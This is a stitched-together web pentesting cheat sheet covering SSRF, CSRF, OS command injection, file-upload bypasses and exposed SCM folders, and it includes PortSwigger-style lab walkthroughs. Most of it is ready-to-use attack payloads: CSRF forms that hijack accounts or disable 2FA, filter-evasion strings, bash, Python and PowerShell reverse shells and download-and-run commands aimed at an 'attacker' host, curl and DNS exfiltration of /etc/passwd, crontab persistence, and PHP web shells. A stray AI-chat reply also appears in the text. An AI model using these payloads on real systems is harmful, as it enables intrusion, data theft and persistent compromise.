   /showimage.php?file=http://burp-collaborator-url
   ```
4. Check logs in Burp for external requests.

## 4. Critical Files Exposure

### Impact:
- Exposure of sensitive files like `database credentials`, `server authentication data`, or `business logic information`.

### Scanning:
```bash
dirb http://target.com/ wordlist.txt
gobuster dir -u http://target.com/ -w wordlist.txt
```

## Cross-Site Request Forgery (CSRF)

### Exploitation:
#### Logout CSRF:
```html
<img src="http://target.com/logout.php">
```
#### Account Takeover CSRF:
1. Capture a profile update request.
2. Change `email` field in CSRF PoC.
3. Open PoC in browser and submit.

### JSON GET - Simple Request

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

# ✅ **Cross-Site Request Forgery (CSRF) – Complete Test Case (with Bypass Cases)**
---
# **1. List of Vulnerabilities (CSRF Attack Surface)**

* **1.1 Missing CSRF Token Validation**
  No anti-CSRF token → attacker forces authenticated actions.

* **1.2 Predictable / Reusable CSRF Tokens**
  Token not random, or same token reused across sessions.

* **1.3 No SameSite Cookie Protection**
  Cookies automatically sent with cross-site requests.

* **1.4 Token Not Bound to Session/User**
  Token reused by another user.

* **1.5 Token Not Bound to HTTP Method**
  Token works even when method changes from POST → GET.

* **1.6 No Origin/Referer Validation**
  Server does not validate request origin.

* **1.7 CSRF with JSON Endpoints**
  API accepts requests from <script> or forms.

* **1.8 CORS Misconfig + CSRF Combo**
  Exploits both → severe account takeover.

* **1.9 Multi-Step CSRF**
  Multi-page transaction forced automatically.

* **1.10 Clickjacking + CSRF Hybrid Attack**
  User tricked into clicking invisible CSRF-trigger action.

---

# **2. Sample Payloads (Core Attack Payloads)**

(Safe training examples — no harmful execution)

### **2.1 HTML Auto-Submit Form (Classic CSRF PoC)**

```html
<html>
<body onload="document.forms[0].submit()">
<form action="https://victim.com/user/update-email" method="POST">
    <input type="hidden" name="email" value="attacker@mail.com">
</form>
</body>
</html>
```

### **2.2 Image Tag (GET-Based CSRF)**

```html
<img src="https://victim.com/settings/disable-2fa">
```

### **2.3 CSRF for Money Transfer**

```html
<form action="https://victim.com/transfer" method="POST">
  <input type="hidden" name="amount" value="5000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.forms[0].submit();</script>
```

### **2.4 JSON CSRF via POST (simple PoC)**

```html
<form action="https://victim.com/api/profile" method="POST"
      enctype="text/plain">
{"email":"attacker@mail.com"}
</form>
<script>document.forms[0].submit();</script>
```

---

# **3. Bypass Payloads (Advanced Techniques)**

### **3.1 CSRF Token Stripping via Content-Type**

Server accepts:

```
Content-Type: text/plain
```

Bypass token requirement:

```html
<form action="https://victim.com/api/change" enctype="text/plain" method="POST">
{"role":"admin"}
</form>
```

### **3.2 SameSite Cookie Bypass**

If server sets:

```
Set-Cookie: session=abc; SameSite=None; Secure
```

Cookies still sent cross-site → CSRF possible.

### **3.3 JSON CSRF Bypass with Misconfigured Parsers**

```html
<form action="https://victim.com/api/update" enctype="application/json" method="POST">
{"admin":true}
</form>
```

### **3.4 CORS-Assisted CSRF**

If server returns:

```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://attacker.com
```

Attacker steals API data:

```js
fetch("https://victim.com/account", {credentials:"include"})
```

### **3.5 Flash CSRF (Legacy Bypass)**

If client-side protects only HTML forms:

```html
<object data="csrf.swf"></object>
```

### **3.6 Null-Origin Bypass**

`Origin: null` via sandboxed iframe:

```html
<iframe sandbox="allow-scripts" srcdoc="
    <form action='https://victim.com/delete' method='POST'></form>
    <script>document.forms[0].submit()</script>
"></iframe>
```

### **3.7 Referer Leak Bypass**

If server checks only Referer domain:

```
https://victim.com.evil.net/update
```

→ bypasses regex.

### **3.8 Preflight Bypass via GET → POST Confusion**

If API incorrectly allows:

```
GET /delete-account
```

---

# **4. Updated With Realistic Testing Payloads (Advanced Learning)**

### **4.1 Change Password CSRF**

```html
<form action="https://victim.com/password/change" method="POST">
  <input type="hidden" name="newPassword" value="Attacker123">
</form>
```

### **4.2 Disable 2FA**

```html
<img src="https://victim.com/user/2fa/disable">
```

### **4.3 Admin Privilege Escalation**

```html
<form action="https://victim.com/admin/update-role" method="POST">
  <input type="hidden" name="role" value="admin">
  <input type="hidden" name="user" value="attacker">
</form>
```

### **4.4 OAuth/SSO CSRF (Force Login)**

```html
<img src="https://victim.com/oauth/authorize?client_id=attacker&response_type=token">
```

### **4.5 CSRF with Multi-Step Transaction**

```html
<iframe src="https://victim.com/step1?amount=5000"></iframe>
<iframe src="https://victim.com/step2"></iframe>
<iframe src="https://victim.com/confirm"></iframe>
```

### **4.6 REST API CSRF**

```html
<form action="https://victim.com/api/user" enctype="application/x-www-form-urlencoded">
  username=hacked&role=admin
</form>
```

---

# **5. Validation / Test Steps**

**Step 1:** Identify state-changing endpoints
→ profile updates, finance actions, admin functions.

**Step 2:** Check if tokens exist

* hidden inputs
* headers
* double submit cookies

**Step 3:** Verify token tied to session/user
→ must be unique per session.

**Step 4:** Try basic CSRF PoC
→ auto-submitting form.

**Step 5:** Try JSON endpoints
→ test `text/plain`, `application/json`, etc.

**Step 6:** Test Origin and Referer validation
→ send custom header values.

**Step 7:** Try advanced bypasses
→ Null-Origin, SameSite=None, CORS combo.

---

# **6. Expected Results / Impact**

* Profile modifications.
* Email/Password change → account takeover.
* Funds transfer without consent.
* Admin privilege escalation.
* OAuth token hijack or unauthorized login.
* Disabling MFA / security settings.

CSRF can lead to **complete account takeover** and financial loss.

### JSON POST - Simple Request

With XHR :

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
//application/json is not allowed in a simple request. text/plain is the default
xhr.setRequestHeader("Content-Type", "text/plain");
//You will probably want to also try one or both of these
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```

With autosubmit send form, which bypasses certain browser protections such as the Standard option of [Enhanced Tracking Protection](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop?as=u&utm_source=inproduct#w_standard-enhanced-tracking-protection) in Firefox browser :

```html
<form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
// this input will send : {"role":admin,"other":"="}
 <input type="hidden" name='{"role":admin, "other":"'  value='"}' />
</form>
<script>
 document.getElementById("CSRF_POC").submit();
</script>
```

### JSON POST - Complex Request

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```

## 6. Two-Factor Authentication (2FA) Bypass

### Exploitation:
- Login to an account where 2FA is implemented.
- Try directly accessing resources after authentication without entering OTP.

## 7. Hostile Subdomain Takeover

### Attack Scenario:
1. Find subdomains that point to inactive services.
2. Register on the third-party service and claim the subdomain.
3. Set up phishing attacks on the hijacked subdomain.

### Scanning for Takeovers:
```bash
ruby sub_brust.rb --fast nokia.com
```

## References:
- [PayloadsAllTheThings - CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
- [CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
- [SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF)
- [CSRF Exploits](https://github.com/qazbnm456/awesome-web-security/blob/master/README.md#csrf---cross-site-request-forgery)

---
# Security Testing Techniques

## 13. Command Injection

### Tool:
- [Commix](https://github.com/commixproject/commix)

Example of Command Injection with PHP:
Suppose you have a PHP script that takes a user input to ping a specified IP address or domain:
```
<?php
    $ip = $_GET['ip'];
    system("ping -c 4 " . $ip);
?>
```
### Identification:
Find an input field that interacts with the operating system shell. Try executing system shell commands using delimiters.

**Example:**
```bash
ping -c 5 127.0.0.1
```

### Chaining Commands

In many command-line interfaces, especially Unix-like systems, there are several characters that can be used to chain or manipulate commands. 


* `;` (Semicolon): Allows you to execute multiple commands sequentially.
* `&&` (AND): Execute the second command only if the first command succeeds (returns a zero exit status).
* `||` (OR): Execute the second command only if the first command fails (returns a non-zero exit status).
* `&` (Background): Execute the command in the background, allowing the user to continue using the shell.
* `|` (Pipe):  Takes the output of the first command and uses it as the input for the second command.

```powershell
command1; command2   # Execute command1 and then command2
command1 && command2 # Execute command2 only if command1 succeeds
command1 || command2 # Execute command2 only if command1 fails
command1 & command2  # Execute command1 in the background
command1 | command2  # Pipe the output of command1 into command2
```

**Possible Parameters:**
`filename, darmon, host, upload, dir, execute, download, log, ip, cli, cmd, file=`

**Example:**
```bash
;ls &&ls ||ls
```

### Bypass Methods:
```bash
;^& && | || %0D %0A \n <
```

### Brute-force:
- Use a payload list of commands (`cmd.txt`).
- Use a delimiter list (`delimeter_list`).
- Cluster bomb attack: Combines different delimiters with parameters sequentially.

**Setting Payload in Injection Point:**
```bash
filename=$delimeter.txt$$cmd.txt$
```

**Burp Suite Intruder:**
- Use the cluster bomb attack type.
- Set two payloads to generate combinations of attacks.

### Exploitation Tool:
```bash
python commix.py -u <url>
```

### Chaining Commands:
```bash
original_cmd_by_server; ls
original_cmd_by_server && ls
original_cmd_by_server | ls
original_cmd_by_server || ls  # Only if the first command fails
```

### Inside a Command:
```bash
original_cmd_by_server `cat /etc/passwd`
original_cmd_by_server $(cat /etc/passwd)
```

### Bypass Techniques:
```bash
w'h'o'am'i  # Single quotes bypass
w"h"o"am"i  # Double quotes bypass
w\ho\am\i  # Backslash bypass
/\b\i\n/////s\h  # Slash bypass
who$@ami  # Using $@
echo $0   # Identifying shell
```
## Filter Bypasses

### Bypass Without Space

* `$IFS` is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret `$IFS` as a space. `$IFS` does not directly work as a separator in commands like `ls`, `wget`; use `${IFS}` instead. 
  ```powershell
  cat${IFS}/etc/passwd
  ls${IFS}-la
  ```
* In some shells, brace expansion generates arbitrary strings. When executed, the shell will treat the items inside the braces as separate commands or arguments.
  ```powershell
  {cat,/etc/passwd}
  ```
* Input redirection. The < character tells the shell to read the contents of the file specified. 
  ```powershell
  cat</etc/passwd
  sh</dev/tcp/127.0.0.1/4242
  ```
* ANSI-C Quoting 
  ```powershell
  X=$'uname\x20-a'&&$X
  ```
* The tab character can sometimes be used as an alternative to spaces. In ASCII, the tab character is represented by the hexadecimal value `09`.
  ```powershell
  ;ls%09-al%09/home
  ```
* In Windows, `%VARIABLE:~start,length%` is a syntax used for substring operations on environment variables.
  ```powershell
  ping%CommonProgramFiles:~10,-18%127.0.0.1
  ping%PROGRAMFILES:~10,-5%127.0.0.1
  ```


### Bypass With A Line Return

Commands can also be run in sequence with newlines

```bash
original_cmd_by_server
ls
```


### Bypass With Backslash Newline

* Commands can be broken into parts by using backslash followed by a newline
  ```powershell
  $ cat /et\
  c/pa\
  sswd
  ```
* URL encoded form would look like this:
  ```powershell
  cat%20/et%5C%0Ac/pa%5C%0Asswd
  ```


### Bypass With Tilde Expansion

```powershell
echo ~+
echo ~-
```

### Bypass With Brace Expansion

```powershell
{,ip,a}
{,ifconfig}
{,ifconfig,eth0}
{l,-lh}s
{,echo,#test}
{,$"whoami",}
{,/?s?/?i?/c?t,/e??/p??s??,}
```


### Bypass Characters Filter

Commands execution without backslash and slash - linux bash

```powershell
swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ tr '!-0' '"-1' <<< .
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```

### Bypass Characters Filter Via Hex Encoding

```powershell
swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```

### Bypass With Single Quote

```powershell
w'h'o'am'i
wh''oami
'w'hoami
```

### Bypass With Double Quote

```powershell
w"h"o"am"i
wh""oami
"wh"oami
```

### Bypass With Backticks

```powershell
wh``oami
```

### Bypass With Backslash and Slash

```powershell
w\ho\am\i
/\b\i\n/////s\h
```

### Bypass With $@

`$0`: Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, `$0` will typically give the name of the shell.

```powershell
who$@ami
echo whoami|$0
```


### Bypass With $()

```powershell
who$()ami
who$(echo am)i
who`echo am`i
```

### Bypass With Variable Expansion

```powershell
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

### Bypass With Wildcards

```powershell
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```
### Dns Based Data Exfiltration

Based on the tool from [HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin), also hosted at [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)

1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
  ```powershell
  for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
  ```

Online tools to check for DNS based data exfiltration:

- http://dnsbin.zhack.ca/
- https://app.interactsh.com/
- Burp Collaborator

---
Click-Jacking

```
<iframe src="http://target site" security="restricted"></iframe>
```
```
<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
  <a href="malicious-link">Click me</a>
</div>
```
Absolutely, Anvesh! Here's a **complete OS Command Injection test case list with sample payloads**, structured for clarity and direct integration into your cheat sheets, automation scripts, or Burp Suite workflows. This aligns with your GitHub methodology and emphasizes both detection and exploitation vectors.

---

## 🧨 OS Command Injection — Test Cases with Payloads

> cmd, command, execute, exec, run, shell, process, task, action, operation, script, script_path, script_name, filename, filepath, file, path, dir, directory, target, ip, host, hostname, ping, traceroute, nslookup, dns, lookup, port, interface, netstat, subnet, mask, gateway, route, user, username, account, name, key, token, id, uid, gid, group, env, env_var, variable, config, config_path, config_file, backup, restore, upload, download, log, log_path, log_file, debug, trace, monitor, scan, scanner, tool, utility

---

### **1. Basic Command Injection via GET Parameter**
- Inject shell commands using separators like `;`, `&&`, `|`.

```http
GET /vuln.php?ip=127.0.0.1;whoami HTTP/1.1
Host: vulnerable.com
```

---

### **2. Blind Command Injection via Time Delay**
- Use `sleep`, `ping`, or `timeout` to infer execution.

```http
GET /vuln.php?user=admin; sleep 10 HTTP/1.1
Host: vulnerable.com
```

---

### **3. Out-of-Band (OOB) Injection**
- Trigger DNS or HTTP callbacks to attacker-controlled server.

```http
GET /vuln.php?cmd=nslookup attacker.com HTTP/1.1
Host: vulnerable.com
```

---

### **4. POST-Based Injection**
- Inject into form fields or body parameters.

```http
POST /submit HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded

username=admin;id
```

---

### **5. Encoded Injection**
- Use URL encoding to bypass filters.

```http
GET /vuln.php?file=%3Bcat%20/etc/passwd HTTP/1.1
Host: vulnerable.com
```

---

### **6. Injection via File Path Parameter**
- Exploit filename or path variables.

```http
GET /download?file=report.txt;ls -la HTTP/1.1
Host: vulnerable.com
```

---

### **7. Injection via Headers**
- Inject into `User-Agent`, `Referer`, or custom headers.

```http
GET / HTTP/1.1
Host: vulnerable.com
User-Agent: Mozilla/5.0; uname -a
```

---

### **8. Injection via Cookies**
- Target server-side parsing of cookie values.

```http
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=abc123;id
```

---

### **9. Injection via Backticks or Subshell**
- Use backticks or `$()` for command substitution.

```http
GET /vuln.php?cmd=`id` HTTP/1.1
Host: vulnerable.com
```

---

### **10. Windows-Specific Injection**
- Use `&&`, `|`, or `&` with `cmd.exe`.

```http
GET /vuln.php?input=foo&cmd=dir& HTTP/1.1
Host: vulnerable.com
```

---

### **11. Linux-Specific Injection**
- Use `;`, `|`, or `&&` with common Linux commands.

```http
GET /vuln.php?input=bar; ls -la / HTTP/1.1
Host: vulnerable.com
```

---

### **12. Injection via Pipes**
- Chain commands using `|`.

```http
GET /vuln.php?cmd=cat /etc/passwd | grep root HTTP/1.1
Host: vulnerable.com
```

---

### **13. Injection via Environment Variables**
- Reference system variables like `$PATH`, `$HOME`.

```http
GET /vuln.php?cmd=echo $HOME HTTP/1.1
Host: vulnerable.com
```

---

### **14. Injection via Command Substitution**
- Use `$(...)` to execute nested commands.

```http
GET /vuln.php?cmd=$(whoami) HTTP/1.1
Host: vulnerable.com
```
# **1. List of Vulnerabilities**
```
1.1 Basic Command Injection
1.2 Blind Command Injection
1.3 Chained Command Execution (&&, |, ;)
1.4 Command Injection via Substitution ($(), backticks)
1.5 Injection in System Calls (exec, system, popen)
1.6 File-Based Injection (/bin/sh -c)
1.7 Windows Shell Injection (cmd.exe)
1.8 Out-of-Band (OOB) Exfiltration
1.9 WAF/Sanitizer Bypass via Encoding
1.10 Obfuscated/RCE Payloads (Base64, Hex, Unicode)
```

---

# **2. Sample Payloads (Core Attack Payloads)**

*(Basic learning/test payloads)*

```
2.1 Basic Linux Command Injection
; id
```

```
2.2 Chained Command Execution
&& whoami
```

```
2.3 Using Pipe Operator
| uname -a
```

```
2.4 Sub-shell Injection
$(id)
```

```
2.5 Backtick Execution
`id`
```

```
2.6 Blind Injection Checker
; sleep 5
```

```
2.7 Windows Command Injection
& dir
```

```
2.8 Write File Test
; echo TEST > /tmp/test.txt
```

```
2.9 DNS OOB Injection
; nslookup attacker.com
```

```
2.10 Curl-Based Callback
; curl attacker.com/ping
```

---

# **3. Sample Payloads (Updated With Real Payloads for Learning)**

*(Common real-world offensive OS command injection strings)*

```
3.1 Full System Enumeration
; id; uname -a; whoami
```

```
3.2 Shadow File Extraction
; cat /etc/shadow
```

```
3.3 Reverse Shell Payload (Bash)
; bash -i >& /dev/tcp/attacker/4444 0>&1
```

```
3.4 Python Reverse Shell
; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

```
3.5 Node.js RCE Payload
; node -e "require('child_process').exec('id',console.log)"
```

```
3.6 Windows Reverse Shell
& powershell -NoP -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
```

```
3.7 Base64 Encoded Command Execution
; echo aWQ= | base64 -d | bash
```

```
3.8 getenv Dump
; printenv
```

```
3.9 Internal Network Discovery
; ping -c 1 127.0.0.1
```

```
3.10 Data Exfiltration (Curl)
; curl -F "file=@/etc/passwd" attacker/upload
```

---

# **4. Bypass Techniques (Filters, Encoding, WAF Evasion)**

*(Bypass payload list only)*

```
4.1 Whitespace Bypass
;${IFS}id
```

```
4.2 IFS Injection (No Space)
id${IFS}-a
```

```
4.3 URL Encoded Injection
%3B%20id
```

```
4.4 Double URL Encoded Injection
%253B%2520id
```

```
4.5 Semi-colon Removal Bypass
|id
```

```
4.6 Comment Truncation Bypass
;id# 
```

```
4.7 Substitution Bypass
`id`
```

```
4.8 Tab Bypass
;	id
```

```
4.9 Base64 Obfuscation
; echo aWQ= | base64 -d
```

```
4.10 Environment Variable Execution
$PATH
```

---

# **5. Advanced Attack Chains (Real-World Exploitation)**

```
5.1 Command Injection → Reverse Shell → Full Access
; bash -i >& /dev/tcp/attacker/4444 0>&1
```

```
5.2 Command Injection → Read Secrets → API Key Theft
; cat /var/www/app/.env
```

```
5.3 Command Injection → Pivoting Internal Network
; nmap -sV 172.16.0.1
```

```
5.4 File Write → Web Shell Deployment
; echo "<?php system($_GET['cmd']); ?>" > /var/www/html/shell.php
```

```
5.5 Blind Command Injection → DNS Exfiltration
; nslookup `cat /etc/passwd` attacker.com
```

```
5.6 Command Injection → Crontab Persistence
; echo "* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1" >> /etc/crontab
```

```
5.7 Command Injection → Kernel Enumeration → PrivEsc Prep
; uname -a; cat /proc/version; id
```

## Insecure Management Interface
Insecure Management Interfaces may lack proper security measures, such as strong authentication, encryption, or IP restrictions, allowing unauthorized users to potentially gain control over critical systems. Common issues include using default credentials, unencrypted communications, or exposing the interface to the public internet.

* Lack of Authentication or Weak Authentication:
    * Interfaces accessible without requiring credentials.
    * Use of default or weak credentials (e.g., admin/admin).
    ```ps1
    nuclei -t http/default-logins -u https://example.com
    ```
* Exposure to the Public Internet
    ```ps1
    nuclei -t http/exposed-panels -u https://example.com
    nuclei -t http/exposures -u https://example.com
    ```
* Sensitive data transmitted over plain HTTP or other unencrypted protocols

**Examples**:

* **Network Devices**: Routers, switches, or firewalls with default credentials or unpatched vulnerabilities.
* **Web Applications**: Admin panels without authentication or exposed via predictable URLs (e.g., /admin).
* **Cloud Services**: API endpoints without proper authentication or overly permissive roles.

# Insecure Source Code Management

> Insecure Source Code Management (SCM) can lead to several critical vulnerabilities in web applications and services. Developers often rely on SCM systems like Git and Subversion (SVN) to manage their source code versions. However, poor security practices, such as leaving .git and .svn folders in production environments exposed to the internet, can pose significant risks. 


## Summary

* [Methodology](#methodology)
    * [Bazaar](./Bazaar.md)
    * [Git](./Git.md)
    * [Mercurial](./Mercurial.md)
    * [Subversion](./Subversion.md)
* [Labs](#labs)
* [References](#references)


## Methodology

Exposing the version control system folders on a web server can lead to severe security risks, including: 

- **Source Code Leaks** : Attackers can download the entire source code repository, gaining access to the application's logic.
- **Sensitive Information Exposure** : Embedded secrets, configuration files, and credentials might be present within the codebase.
- **Commit History Exposure** : Attackers can view past changes, revealing sensitive information that might have been previously exposed and later mitigated.
     
The first step is to gather information about the target application. This can be done using various web reconnaissance tools and techniques. 

* **Manual Inspection** : Check URLs manually by navigating to common SCM paths.
    * http://target.com/.git/
    * http://target.com/.svn/

* **Automated Tools** : Refer to the page related to the specific technology.

Once a potential SCM folder is identified, check the HTTP response codes and contents. You might need to bypass `.htaccess` or Reverse Proxy rules.

The NGINX rule below returns a `403 (Forbidden)` response instead of `404 (Not Found)` when hitting the `/.git` endpoint.

```ps1
location /.git {
  deny all;
}
```
For example in Git, the exploitation technique doesn't require to list the content of the `.git` folder (http://target.com/.git/), the data extraction can still be conducted when files can be read.

## Labs

* [Root Me - Insecure Code Management](https://www.root-me.org/fr/Challenges/Web-Serveur/Insecure-Code-Management)

## References

- [Hidden directories and files as a source of sensitive information about web application - Apr 30, 2017](https://github.com/bl4de/research/tree/master/hidden_directories_leaks)
- 

## References

- [CAPEC-121: Exploit Non-Production Interfaces - CAPEC - July 30, 2020](https://capec.mitre.org/data/definitions/121.html)
- [Exploiting Spring Boot Actuators - Michael Stepankin - Feb 25, 2019](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
- [Springboot - Official Documentation - May 9, 2024](https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-endpoints.html)

## 14. File Uploading

### Tools:
- [Fuxploider](https://github.com/almandin/fuxploider)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)

### Methods:
1. **Simple File Upload**
   - Upload `c99.php` or `dhanush.php` for execution.
   - Use `nc.exe` for a reverse shell (Windows).
2. **Content-Type Bypass**
   - Modify the `Content-Type` header in Burp Suite.
   - Example: Change `text/php` to `image/jpeg`.
3. **Extension Verification Bypass**
   - Use double extensions (`shell.php.jpg`).

**1. Extension Filter Bypass**  
Upload executable file with double or spoofed extension.

`filename`  
```text
shell.php.jpg
shell.jpg.php
shell.pHp
```

✅ Expected: Extension validated strictly  
❌ Vulnerable: Executable file accepted

---

**2. MIME Type Bypass**  
Spoof `Content-Type` header to bypass validation.

`http`  
Header:  
```http
Content-Type: image/png
```

✅ Expected: MIME type verified server-side  
❌ Vulnerable: File accepted based on header alone

---

**3. Magic Bytes Bypass**  
Embed shell after valid image header.

`bash`  
```bash
echo "<?php system($_GET['cmd']); ?>" >> image.png
```

✅ Expected: File scanned for actual content  
❌ Vulnerable: Shell executed despite image header

---

**4. Content-Disposition Manipulation**  
Inject malicious filename via multipart upload.

`http`  
Header:  
```http
Content-Disposition: form-data; name="file"; filename="shell.php"
```

✅ Expected: Filename sanitized  
❌ Vulnerable: Executable file saved

---

**5. NTFS ADS Bypass (Windows)**  
Use alternate data stream to hide payload.

`filename`  
```text
shell.asp:.jpg
shell.asp::$data
```

✅ Expected: ADS rejected or ignored  
❌ Vulnerable: Payload executed via ADS

---

**6. Filename Length Truncation**  
Exploit filename length limits to hide extension.

`filename`  
```text
A...A.php.png (255 bytes total)
```

✅ Expected: Full filename validated  
❌ Vulnerable: Executable extension preserved

---

**7. Image Metadata Injection**  
Embed shell in EXIF metadata.

`bash`  
```bash
exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpg
```

✅ Expected: Metadata stripped or ignored  
❌ Vulnerable: Shell executed from metadata

---

**8. Compression Bypass**  
Upload compressed image with embedded shell.

✅ Expected: File decompressed and scanned  
❌ Vulnerable: Shell survives compression

---

**9. Resizing Bypass**  
Upload image with shell in non-resized chunk (e.g. PLTE).

✅ Expected: Image resized securely  
❌ Vulnerable: Shell chunk preserved

---

**10. File Path Traversal via Filename**  
Inject traversal sequences in filename.

`filename`  
```text
../../../../var/www/html/shell.php
```

✅ Expected: Path sanitized  
❌ Vulnerable: File written outside intended directory

---

**11. Client-Side Validation Only**  
Rely on JavaScript to block `.php` uploads.

✅ Expected: Server-side validation enforced  
❌ Vulnerable: JS bypassed, file accepted

---

**12. Upload Location Disclosure**  
Server reveals upload path in response.

✅ Expected: Generic success message  
❌ Vulnerable: Full path disclosed

---

**13. HTML/JS Upload for XSS**  
Upload `.html` or `.js` file with script payload.

`html`  
```html
<script>alert('XSS')</script>
```

✅ Expected: File served as download or blocked  
❌ Vulnerable: Script executed in browser

---

**14. SVG Upload with JavaScript**  
Embed JS in SVG file.

`svg`  
```xml
<svg><script>alert('XSS')</script></svg>
```

✅ Expected: SVG sanitized or blocked  
❌ Vulnerable: JS executed on render

---

**15. Polyglot File Upload**  
Merge shell with valid file format (e.g. JPEG + PHP).

✅ Expected: File parsed strictly  
❌ Vulnerable: Executable code triggered

### Tool:
- [FuzzDB Malicious Images](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/file-upload/malicious-images)


```
POST /my-account/avatar HTTP/2
...
-----------------------------372082654728426116931381616293
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
-----------------------------372082654728426116931381616293
...
```
![image](https://github.com/user-attachments/assets/9d64d730-dd3d-4309-a589-97f08634ebd2)

Now you can read the value of the file ("G5Bm58gT0NzAmOPLxpe0vR82y4CNT6WY") accessing /avatars/test.php:
![image](https://github.com/user-attachments/assets/c8f1a76d-9fe6-4800-8483-64fd7fe2eaac)

2. Web shell upload via Content-Type restriction bypass

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.
If we try the same payload as the previous lab there is an error:

![image](https://github.com/user-attachments/assets/8b2d8cb9-4f01-4c0f-a672-e34e92b1076c)

Changing the Content-Type it is possible to upload the PHP file:

![image](https://github.com/user-attachments/assets/72addbcb-19e8-42de-80d2-2d0f2abccec0)

And read the secret ("wDHZLacPXl2c4B4MZl2j7T3MluCqDzjR"):

![image](https://github.com/user-attachments/assets/0c9ac776-1042-44f0-a09c-7489bede795a)
---
# Web shell upload via path traversal

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

It is possible to upload a PHP file:

![image](https://github.com/user-attachments/assets/718e00e3-b216-443f-8ba8-2d1d13306162)

But it does not execute:

![image](https://github.com/user-attachments/assets/f35e355d-e098-4cd7-844a-52907b284450)

To execute the PHP file we will upload it in a different directory using path traversal. We need to encode the payload or it will not work (filename="%2e%2e%2fb.php"):

```
POST /my-account/avatar HTTP/2
...
-----------------------------40637643122628174081089911774
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fb.php"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
-----------------------------40637643122628174081089911774
...
```
![image](https://github.com/user-attachments/assets/cc2fd1f9-6644-42b1-8ca8-7e590d00ca8e)

The files is uploaded to the folder “/files” and not “/files/avatars”:

![image](https://github.com/user-attachments/assets/31501f21-992f-4d8a-a10e-47136bbd571f)

# Web shell upload via extension blacklist bypass

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist. To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

New .htaccess file:

```
-----------------------------230880832739977645353483474501
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: application/octet-stream

